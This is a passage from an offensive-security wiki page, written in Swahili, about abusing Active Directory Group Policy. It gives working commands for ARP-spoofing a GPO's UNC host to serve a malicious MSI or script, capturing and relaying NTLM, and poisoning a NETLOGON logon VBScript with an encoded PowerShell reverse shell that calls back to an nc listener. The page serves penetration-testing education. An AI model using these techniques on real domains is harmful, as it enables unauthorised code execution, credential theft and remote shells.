Ikiwa GPO iliyounganishwa itasambaza MSI kutoka kwenye njia ya UNC, mteja ataipakua wakati wa **kuanzisha kompyuta** na kuisakinisha kama **`NT AUTHORITY\SYSTEM`**. Kwa kuiga host inayorejelewa na kutoa MSI hasidi chini ya **share/path/name ileile**, unaweza kubadilisha `WriteGPLink` kuwa utekelezaji wa msimbo wa SYSTEM **bila kurekebisha SYSVOL**.

Vikwazo muhimu:

- **Muda ni muhimu**: kiungo kipya kitaonekana wakati wa kuonyesha upya sera (kwa kawaida takriban dakika 90), lakini **Software Installation** kwa kawaida huanzishwa wakati wa **kuwasha upya**.
- Windows Installer kwa kawaida hufuatilia usambazaji kwa kutumia **`ProductCode`** ya kifurushi. Ikiwa bidhaa tayari imesakinishwa, usambazaji unaweza kurukwa.
- Ili kuzuia kukataliwa na kisakinishi, rekebisha MSI hasidi ili **`ProductCode`** na **`PackageCode`** zake zilingane na za kifurushi halali kinachotarajiwa na GPO.
- Faili za matangazo za zamani za `.aas` zinaweza kubaki kwenye `SYSVOL`, kwa hivyo hakikisha kuwa usambazaji bado unaonekana kuwa amilifu kabla ya kuutegemea.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings katika `Drives.xml` husababisha watumiaji kuthibitisha utambulisho wao kwenye njia ya UNC iliyosanidiwa wanapoingia au kuunganisha tena. Ukijifanya kuwa host iliyorejelewa, unaweza kunasa **NetNTLMv2**. SMB ikishindwa kimakusudi, Windows inaweza kujaribu tena kupitia **WebDAV**, na kutuma **NTLM over HTTP**. Hii hutoa unyumbufu mkubwa zaidi wa kufanya relay kwenda **LDAP(S)**, **AD CS**, au **SMB**.

#### Logon/startup script UNC hijack

Mfumo huohuo hutumika kwa scripts zinazopangishwa kwenye UNC na kugunduliwa katika `SYSVOL`:

- **Logon scripts** kwa kawaida hutekelezwa katika muktadha wa **user**.
- **Startup scripts** kwa kawaida hutekelezwa katika muktadha wa **computer / SYSTEM**.

Ikiwa njia ya script inaelekeza kwenye hostname inayoweza kuigwa, elekeza upya host ya UNC na utoe maudhui mbadala ya script kutoka eneo linalotarajiwa.

## SYSVOL/NETLOGON Logon Script Poisoning

Njia zinazoweza kuandikwa chini ya `\\<dc>\SYSVOL\<domain>\scripts\` au `\\<dc>\NETLOGON\` huruhusu kubadilisha logon scripts zinazotekelezwa watumiaji wanapoingia kupitia GPO. Hii huwezesha kutekeleza msimbo katika muktadha wa usalama wa watumiaji wanaoingia.

### Tafuta logon scripts
- Kagua sifa za user ili kuona kama kuna logon script iliyosanidiwa:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Chunguza shares za domain ili kubaini shortcuts au marejeo ya scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Changanua faili za `.lnk` ili kutambua mahali lengwa zinapoelekeza ndani ya SYSVOL/NETLOGON (mbinu muhimu ya DFIR na kwa washambuliaji wasio na ufikiaji wa moja kwa moja wa GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound huonyesha attribute ya script ya kuingia ya `scriptPath` ya user object inapokuwepo. Script za kuingia zilizosanidiwa kupitia GPO ni marejeleo tofauti ya policy, kwa hivyo kagua pia GPO inayotumika.

### Thibitisha ufikiaji wa kuandika (usiamini orodha za share)
Zana za kiotomatiki zinaweza kuonyesha SYSVOL/NETLOGON kama read-only hata wakati script husika ina NTFS ACL tofauti. Anza kwa kukagua faili hiyo na directory yake ya parent bila kufanya mabadiliko; Allow ACE zinazolingana bado ni wagombea kwa sababu ufikiaji halisi wa SMB na NTFS, Deny ACE, na token ya sasa vyote vina umuhimu:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Jaribio la uandishi lililoidhinishwa linapaswa kulenga mfumo maalum na liweze kurejeshwa nyuma, huku script ya awali ikiwa imehifadhiwa nakala na kurejeshwa. Usibadilishe script ya logon inayofanya kazi kwa ajili tu ya kujaribu ufikiaji; uandishi ukifaulu, script inaweza kutekelezwa mtumiaji mwingine atakapoingia tena.

### Poison script ya logon ya VBScript kwa RCE
Ongeza amri inayozindua reverse shell ya PowerShell (itengeneze kutoka revshells.com) na uache mantiki ya awali ili kuepuka kuvuruga utendaji wa biashara:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Sikiliza kwenye host yako na usubiri logon inayofuata ya mwingiliano:

```bash
rlwrap -cAr nc -lnvp 443
```

Notes:
- Utekelezaji hufanyika chini ya token ya mtumiaji wa logging (si SYSTEM). Wigo ni kiungo cha GPO (OU, site, domain) kinachotumia script hiyo.
- Safisha kwa kurejesha maudhui/timestamps asilia baada ya matumizi.


## References

- [1] [Kutumia vibaya Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Akaunti zenye haki za juu na token privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Sasisho la njia za mashambulizi za ACL](https://wald0.com/?p=112)
- [4] [Enum ya ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Kuongeza privileges kwa kutumia ACLs katika Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Kuchanganua privileges na akaunti zenye privileges katika Active Directory](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Operesheni za sifa za AD/UAC kutoka Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (uanachama wa kikundi)](https://www.samba.org/)
- [10] [HTB Puppy: Kutumia vibaya AD ACL, kuvunja Argon2 ya KeePassXC, na kufungua DPAPI ili kupata admin wa DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Kuteka nyara njia za UNC za GPO kwa ajili ya utekelezaji wa code na NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: kutumia vibaya GPO za Active Directory kupitia NTLM relaying, na mengineyo](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU inatania? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: kutumia vibaya njia fiche za mashambulizi ya ACL za Organizational Units katika Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Kuiga huduma halali za Active Directory kwenye mtandao: kisa cha unyonyaji wa GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [GPOddity ya Synacktiv](https://github.com/synacktiv/GPOddity)
- [17] [OUned ya Synacktiv](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — Uhamishaji kati ya OU na kutumia vibaya ACL zilizorithiwa](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
